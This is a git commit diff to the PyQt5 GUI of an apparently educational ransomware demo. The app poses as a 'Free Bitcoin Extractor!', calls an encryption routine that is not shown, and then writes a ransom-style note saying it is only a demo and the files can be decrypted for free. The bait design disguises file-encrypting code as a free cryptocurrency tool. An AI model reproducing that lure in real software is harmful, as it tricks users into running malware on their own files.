57d36dcdfd1d444aea5cf5ad1e93a8e48d9850f1
Rayan Tofique <rayantofique@gmail.com>
2019-04-23 23:07:47 -0400

    changes to gui

--- ransomware_software/gui.py
+++ ransomware_software/gui.py
@@ -1,9 +1,10 @@
 #!/usr/bin/env python
 
-from win32api import GetSystemMetrics
+#from win32api import GetSystemMetrics
 from functools import partial
 
 
+import os
 import sys
 import re
 from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLineEdit, QProgressBar
@@ -17,8 +18,8 @@ class App(QWidget):
 	def __init__(self):
 		super().__init__()
 		self.title = 'Free Bitcoin Extractor!'
-		self.left = GetSystemMetrics(0) / 2
-		self.top = GetSystemMetrics(1) / 2
+		self.left = 500
+		self.top = 500
 		self.width = 600
 		self.height = 400
 		self.initUI()
@@ -31,7 +32,7 @@ class App(QWidget):
 		self.emailLine.textChanged.connect(self.changeEnableButtonStatus)
 
 		self.decryptButton = self.setButton('Send Bitcoins', self.decrypt, [150, 70], [320, 170])
-		self.decryptButton.setEnabled(False)
+
 
 		self.encryptButton = self.setButton('Search Bitcoins', self.encrypt, [150, 70], [120, 170])
 		self.encryptButton.setEnabled(False)
@@ -75,7 +76,11 @@ class App(QWidget):
 		rs_api.encrypt(self.emailLine.text())
 		self.progressBar.setValue(100)
 		#enable decryption after encryption is complete
-		self.decryptButton.setEnabled(True)
+
+		self.decryptButton.setText("Decrypt Files")
+		self.encryptButton.setText("Encrypt Files")
+		self.title = 'You got ransomwared son!'
+		write_text_file()
 
 	def decrypt(self):
 		#decryption script called here- will also update the loading bar
@@ -89,6 +94,15 @@ class App(QWidget):
 		button.resize(size[0], size[1])
 		button.move(position[0], position[1])
 		return button
+
+
+def write_text_file():
+	f = open("instructions.txt", "w")
+	f.write("Your files have been encrypted!!!")
+	f.write("Normally, an attacker at this point would request crypto currency payment and give instructions on how to do that.")
+	f.write("Since this is just a demo for educational purposes, we will forego that part and allow you to simply decrypt your files by pressing on the decrypt button.")
+	f.write("Stay safe out there!")
+	f.close()
 
 
 def isValidEmail(email):
